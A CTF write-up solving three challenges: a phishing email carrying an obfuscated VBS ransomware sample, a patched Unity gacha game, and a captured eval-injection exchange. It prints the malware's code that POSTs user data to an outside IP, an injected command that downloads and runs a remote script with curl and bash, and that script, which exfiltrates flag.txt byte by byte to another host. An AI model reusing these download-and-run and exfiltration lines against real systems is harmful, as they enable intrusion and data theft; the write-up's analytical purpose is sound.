
# DEF CON Invitation
Given file: eml file.
![[DEFCON_Finals_Invitation.eml]]

So we start out with an email. Looking at the message ID we see `Message-Id: <20230626040116.E7EA75474A4@emkei.cz>` which means that this was made with the fake emailer software emkei which explains how the email address looks real since emkei can send emails from any address without having access to it. So we can move on to looking at the attached calendar invite. 

The body of the calendar invite has two links
`https://storage.googleapis.com/defcon-nautilus/venue-guide.html and https://nautilus.org/`
The venue-guide link leads us to download a file named `venue-map.png.vbs` which is a poor attempt at hiding visual basic code as a png file. 
The vbs file has a lot of code in it, a lot is only relevant to the malware but everything after the final "your data is ours now pls send bitcoin" message is heavily obfuscated and looks strange, why would there be more code after the ransom message?

I picked out all the strange code and placed it in my own vbs file to run. 
![[pls.vbs]]

The output is as follows:
`c:\temp\defcon-flag.png.compromised `
`https://download1647.mediafire.com/l188u2d532qg3fOoLpilcI89p0_h4E0cGLjk_uvBUiag7E_rMZ-H5-me9Kr9SQLVQaKSiKcEvJO-EkfTSUqWlrN6SzXgI0LYBh-F5em4IA4iX3tOIGh0Ej46GlwvLOfT8pzvuy91Utej1r2I0jg7YsUNcssPted508dskWRpkAI/yea535hvgp32vmv/defcon-flag.png.XORed`

`Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")                Dim url: url = "http://20.106.250.46/sendUserData"                              With http                                                                          Call .Open("POST", url, False)                                                  Call .SetRequestHeader("Content-Type", "application/json")                      Call .Send("{""username"":""" & strUser & """}")                             End With                                                                        res = Msgbox("Thank you for your cooperation!", vbOKOnly+vbInformation, "")`

The second one is a link to download a file named `defcon-flag.png.XORed` which, from the name, we can assume is our flag as an image that has been XORed. So now we just need to the key to XOR it back with. 

If we send our own POST request to the url in the third output (I used https://reqbin.com/post-online to do this) with a blank username, we get the following returned:
`{
    "key": "compromised",
    "msg": "Not admin!"
}`

Interesting. So if we instead send admin as the username, we get:
`{
    "key": "02398482aeb7d9fe98bf7dc7cc_ITDWWGMFNY",
    "msg": "Data compromised!"
}`

Very nice. From here I had to play around with cyberchef to work out how to use this key. I ended up converting the key to hex and XORing it with the png.XORED file and got the following image.
![[Pasted image 20230827115653.png]]
If we then flip the image both vertically and horizontally, we get the flag 
`SEKAI{so_i_guess_we'll_get_more_better_next_year-_-}`

For reference, my final cyberchef recipe was https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Hex','string':'30%2032%2033%2039%2038%2034%2038%2032%2061%2065%2062%2037%2064%2039%2066%2065%2039%2038%2062%2066%2037%2064%2063%2037%2063%2063%205f%2049%2054%2044%2057%2057%2047%204d%2046%204e%2059'%7D,'Standard',false)Render_Image('Raw')Flip_Image('Vertical')Flip_Image('Horizontal')

# Azusawa's Gacha World
Given files:
![[dist.zip]]

We start with the following description of an unfortunate weeb.
![[Pasted image 20230827120427.png]]
After a brief flashback to previous Love Live gacha related trauma, we can look at our files to see that we have a Unity game on our hands. Upon boot, we are greeted with a gacha screen that any gacha veteran knows well.
![[Pasted image 20230827120658.png]]
Only enough gems for a single pull?! Sinful. Of course this doesn't stop me from pulling my one waifu. I get a summer edition card. Anyway, now out of gems, we investigate the rest of the page. Of course it is all in Japanese but this doesn't stop a gacha game virtuoso so I pull out my handy google translate on my phone and begin reading. 
![[Pasted image 20230827120950.png]]
... harsh. That is a 0% rate right there. Fortunately, this game has a pity system, unfortunately, that pink banner there says that the pity only kicks in at 1 million pulls.. 

At this point I remember that this is a reversing challenge so this means either we need to change the rates to 100% or add enough gems to pull 1 million times. At this point, I also had the thought that clearly the flag will be included on the card, so perhaps we could just extract the assets like a dataminer whenever a new update releases?

I first looked into my second approach, after some googling I found that a program called AssetStudio `https://github.com/Perfare/AssetStudio` is capable of extracting assets from unity games. So I pointed it to the `Asusawa's Gacha World_Data` folder and let it go (after turning off error messages in the debug menu!). However, the program was frequently not responding and seemed to be taking a while so I left it going in the background and moved on to doing this the reversing way.

After looking into how to hack a unity game, I found that I could use a tool called dnspy `https://github.com/dnSpy/dnSpy` (this tool is actually no longer maintained but worked for this challenge) on the `Asusawa's Gacha World_Data\Managed\Assembly-CSharp.dll` file where the source code can be decompiled from. 

Ill spare you reading about everything I looked at and keep this relevant. Opening the dll in dnspy, we can look in the `-` namespace to find the relevant code. I first tried changing the start function to set the pull number in the gameState class to 1 million but since dnspy decompiles to its best approximation of C# code, the code in the start function was now invalid and I couldn't get any changes to compile and save. Instead, I found the spendCrystals function and changed it from:
`public void SpendCrystals(int numPulls){    
this.crystals -= ((numPulls == 1) ? 100 : 1000);    
this.pulls += numPulls;  
}`
to 
`public void SpendCrystals(int numPulls)  
{    this.crystals -= ((numPulls == 1) ? 0 : 0);    this.pulls += 999999;  
}`
So that the crystals will no longer decrease when pulling and so a single pull will increment the pity tracker by 999,999 instead of 1. We can then save the module (ctrl+shift+s) and reopen our gacha game. 

Now, we can pull as much as we want! Truly the dream. So our first single pull will get us a random waifu while the second one will get us the elusive birthday waifu! But, for some reason, I didn't get an animation when I pulled her and I can't click on her portrait to view the full card.. strange. After trying a few more times I realised that I am an idiot, based on pure muscle memory, I kept clicking the skip animation button on the first pull which then skipped the animation for the birthday pull... 

So, I learnt how to get some patience and did not click the skip button this time and was able to see our wonderful birthday waifu and, as expected, our flag!
![[Pasted image 20230827123406.png]]
This is the point where I closed my email to SEGA since they asked so nicely. 

Also, as a side point, at some point during this, asset studio did finish ripping the assets from the game and confirmed that it can also get the flag by searching for the flag file in its results.
![[Pasted image 20230827123614.png]]

# Eval Me
Given File:
![[capture.pcapng]]

The interesting traffic in this capture seems to be the numbers that the user is sending to the server. Based on the fact that the server given seems to ask for the user to calculate random equations, we could assume that these are the answers to those equations. Although, the data does seem to be in hex. 

Regardless, when we pull out all the data using `strings capture.pcapng | grep '{"data":' | cut -c 10-11` we get 
`20 76 20 01 78 24 45 45 46 15 00 10 00 28 4b 41 19 32 43 00 4e 41 00 0b 2d 05 42 05 2c 0b 19 32 43 2d 04 41 00 0b 2d 05 42 28 52 12 4a 1f 09 6b 4e 00 0f`

For now we can't do anything with this so lets investigate the netcat that was given in the challenge description. Upon connecting we are told that this is a simple intro to pwntool challenge where we must solve 100 equations in a time limit to get the flag. For this, I slightly modified the script from this writeup https://ctfwriteups.trwbox.com/competitions/SnykConCTF/Calculator/ to end up with 
![[solver.py.txt]]
This solves the equations nicely until we get an error with output 
```__import__("subprocess").check_output("(curl -sL https://shorturl.at/fgjvU -o extract.sh && chmod +x extract.sh && bash extract.sh && rm -f extract.sh)>/dev/null 2>&1||true",shell
Traceback (most recent call last):
  File "/home/kali/Downloads/solver.py", line 34, in <module>
    eq1 = eval(stringEquation)
          ^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1
    __import__("subprocess").check_output("(curl -sL https://shorturl.at/fgjvU -o extract.sh && chmod +x extract.sh && bash extract.sh && rm -f extract.sh)>/dev/null 2>&1||true",shell
                                         ^
SyntaxError: '(' was never closed
```
Strange. If we also run the curl command we end up downloading the following script:
```
#!/bin/bash

FLAG=$(cat flag.txt)

KEY='s3k@1_v3ry_w0w'


# Credit: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46
Asc() { printf '%d' "'$1"; }


XOREncrypt(){
    local key="$1" DataIn="$2"
    local ptr DataOut val1 val2 val3

    for (( ptr=0; ptr < ${#DataIn}; ptr++ )); do

        val1=$( Asc "${DataIn:$ptr:1}" )
        val2=$( Asc "${key:$(( ptr % ${#key} )):1}" )

        val3=$(( val1 ^ val2 ))

        DataOut+=$(printf '%02x' "$val3")

    done

    for ((i=0;i<${#DataOut};i+=2)); do
    BYTE=${DataOut:$i:2}
    curl -m 0.5 -X POST -H "Content-Type: application/json" -d "{\"data\":\"$BYTE\"}" http://35.196.65.151:30899/ &>/dev/null
    done
}

XOREncrypt $KEY $FLAG

exit 0
```
This is the point where it was getting late (roughly 20 minutes until CTF ended) and I just gave chatgpt my previous hex values found from the pcap and this script and it gave me this script to reverse the XOR with:
```
ENCRYPTED="20 76 20 01 78 24 45 45 46 15 00 10 00 28 4b 41 19 32 43 00 4e 41 00 0b 2d 05 42 05 2c 0b 19 32 43 2d 04 41 00 0b 2d 05 42 28 52 12 4a 1f 09 6b 4e 00 0f"
KEY='s3k@1_v3ry_w0w'

# Convert encrypted string to an array of bytes
IFS=" " read -ra BYTE_ARRAY <<< "$ENCRYPTED"

DECRYPTED=""
for ((i = 0; i < ${#BYTE_ARRAY[@]}; i++)); do
    BYTE=${BYTE_ARRAY[i]}
    KEY_BYTE=${KEY:$((i % ${#KEY})):1}  # Obtain the corresponding key byte
    DECRYPTED_BYTE=$((0x$BYTE ^ $(printf '%d' "'$KEY_BYTE")))  # XOR operation
    DECRYPTED+="\\x$(printf '%02x' "$DECRYPTED_BYTE")"  # Convert back to ASCII
done

echo -e "$DECRYPTED"
```
running this script gave me the flag of `SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483}`

